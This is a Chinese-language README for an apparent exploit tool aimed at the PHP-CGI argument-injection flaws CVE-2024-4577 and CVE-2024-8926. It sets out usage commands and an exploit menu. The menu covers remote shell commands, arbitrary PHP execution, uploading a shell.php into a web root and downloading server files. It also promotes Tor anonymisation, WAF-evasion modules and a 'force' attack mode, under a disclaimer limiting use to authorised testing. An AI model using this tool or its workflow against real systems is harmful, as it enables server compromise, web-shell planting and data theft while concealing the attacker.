# PHP-CGI Injector

🚀 **CVE-2024-4577 & CVE-2024-8926 Exploit Tool**

> 針對 **PHP-CGI 參數注入漏洞** 的自動化測試工具，支持 **CVE-2024-4577** 和 **CVE-2024-8926**，可進行 **命令執行、文件上傳、下載** 等操作。

---

## **📌 介紹**
本工具可用於測試 **PHP-CGI 環境中的參數注入漏洞**，並提供：
- ✅ 超酷的終端介面與動畫效果
- ✅ 自動化漏洞掃描
- ✅ 多種攻擊模式（Shell、PHP代碼執行、檔案上傳/下載）
- ✅ 預設及自訂 Payload 組合
- ✅ Tor 流量隱藏模式
- ✅ 多種 Bypass WAF 繞過模組
- ✅ 支援輸出編碼自動轉換
- ✅ 強制漏洞利用模式（即使未掃描出漏洞也可啟動）
- ❌ 不支援泡咖啡，但支援烘烤 WAF。
- ❌ 不支援幫你打報告、追女友或考上研究所。
- ❌ 不支援社交工程，請自行面對人類。

---

## **📜 免責聲明**
**本工具僅限於合法測試與學術用途，請勿用於未經授權的系統！**
> **⚠️ 非法使用將承擔法律責任！**

本工具僅供：
- 🔹 **企業紅隊滲透測試**
- 🔹 **CTF 安全研究**
- 🔹 **個人安全學習**
- 🔹 **其他取得合法授權之安全測試**

---

## **📥 安裝依賴**
本工具依賴以下 Python 套件，請先安裝：
```bash
pip install -r requirements.txt
```
或者手動安裝：
```bash
pip install requests requests-tor chardet urllib3 rich
```

---

## **🛠️ 使用方法**
### **📌 基本用法**
```bash
python exploit.py -u URL [--timeout sec] [--delay sec] [--log] [--verbose] [--payload PAYLOAD] [--bypass] [--tor] [--no-effects] [--force] [--cgipoint PATHS...]
```
範例：
```bash
python exploit.py -u http://example.com --timeout 30 --payload 2 --log --tor --verbose
python exploit.py -u http://example.com --bypass --force
python exploit.py -u http://example.com --cgipoint /php-cgi/php-cgi.exe /cgi-bin/php
```

### **📌 參數選項**

| 參數                  | 說明                             | 範例                    |
|-----------------------|----------------------------------|-------------------------|
| `-u` 、 `--url`       | 指定目標網址                     | `-u http://example.com` |
| `--timeout sec`       | 設定請求超時（0為無限）          | `--timeout 30`          |
| `--log`               | 自動記錄shell命令                | `--log`                 |
| `--payload`           | 指定或自訂Payload組合            | `--payload 2`           |
| `--tor`               | 透過Tor發送請求                  | `--tor`                 |
| `--verbose`           | 顯示詳細訊息                     | `--verbose`             |
| `--bypass`            | 啟用WAF繞過模式                  | `--bypass`              |
| `--force`             | 強制進入漏洞利用模式             | `--force`               |
| `--cgipoint PATHS`    | 指定特定CGI路徑進行測試         | `--cgipoint /path`      |
| `--delay sec`         | 每次請求之間的延遲秒數          | `--delay 1.5`           |
| `--no-effects`        | 關閉所有動畫與延遲效果           | `--no-effects`          |
---

## **📌 操作模式**
當腳本找到漏洞後，會顯示選單：
```
╭────────────  Exploit 模式選單  ────────────╮
│ 當前目標：http://example.com/              │
│ 當前注入點：/php-cgi/php-cgi.exe           │
│ 漏洞編號：CVE-2024-4577                    │
╰────────────────────────────────────────────╯
1) 🧪 Shell模式
2) 🛠️ PHP自訂端模式
3) 📤 上傳檔案
4) 📥 下載檔案
5) 🎯 切換攻擊目標
6) ⚙️ 設定參數
7) ❌ 離開程式
>>
```

---

## **📌 模式詳解**
### **1️⃣ Shell 模式**
執行 **系統命令**：
```
shell> whoami
```
📂 **儲存輸出**
```
shell> whoami --save
```
```
shell> whoami --save C:\output\whoami.txt
```

---

### **2️⃣ PHP 自訂模式**
執行 **自訂 PHP 代碼**：
```
phpinfo();
EOF
```
📂 **儲存輸出**
```
phpinfo();
EOF --save
```
```
phpinfo();
EOF --save C:\output\info.html
```

---

### **3️⃣ 上傳檔案**
```
本地檔案路徑：C:\test\shell.php
目標完整路徑：
[*] 已自動設定上傳路徑為: C:/xampp/htdocs/shell.php
```
📂 **手動指定路徑**
```
目標完整路徑：C:\xampp\php\shell.php
```

---

### **4️⃣ 下載檔案**
```
遠端檔案路徑：C:\xampp\htdocs\index.php
```
📂 **檔案下載後儲存於 `download/`，若有重複，會自動添加編號**
```
[*] 檔案下載完成，儲存在 download/index.php
```

---

### **5️⃣ 切換攻擊目標**
```
輸入新目標URL: http://newtarget.com
```
🔹 **將重新測試漏洞**

---

### **6️⃣ 參數切換**
```
[⚙️ 利用階段參數設定選單]

1) 切換荷載 Payload        1
2) 繞過模組 Bypass         未選擇
3) 等待時間 Timeout        10 秒
4) 請求延遲 Delay          0 秒
5) 自動紀錄 Log            關閉
6) 詳細模式 Verbose        關閉
7) 動畫效果 Effects        開啟
8) 強制利用 Force          關閉
9) 儲存並返回 Exploit 選單
```
---

## 📌 Bypass WAF 繞過模組

提供以下繞過策略：
- CGI路徑變形
- Payload前後添加無效字符
- 替換 `php://input` 為其他寫法
- 添加特定或隨機HTTP頭
- 混淆POST內容
- 隨機打亂Payload順序
- 自訂繞過腳本，格式請看tamper_example_template.txt
---

